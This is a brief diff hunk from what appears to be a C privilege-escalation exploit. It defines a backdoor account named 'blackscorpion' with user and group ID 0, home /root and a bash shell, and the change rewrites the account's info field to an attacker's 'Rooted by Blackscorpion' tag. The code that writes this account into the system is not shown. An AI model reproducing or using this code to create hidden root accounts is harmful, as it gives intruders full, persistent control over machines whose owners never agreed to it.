@@ -101,7 +101,7 @@ int main(int argc, char *argv[])
   user.username = "blackscorpion";
   user.user_id = 0;
   user.group_id = 0;
-  user.info = "pwned";
+  user.info = "Rooted by Blackscorpion . Blackscorpion Inside";
   user.home_dir = "/root";
   user.shell = "/bin/bash";
 
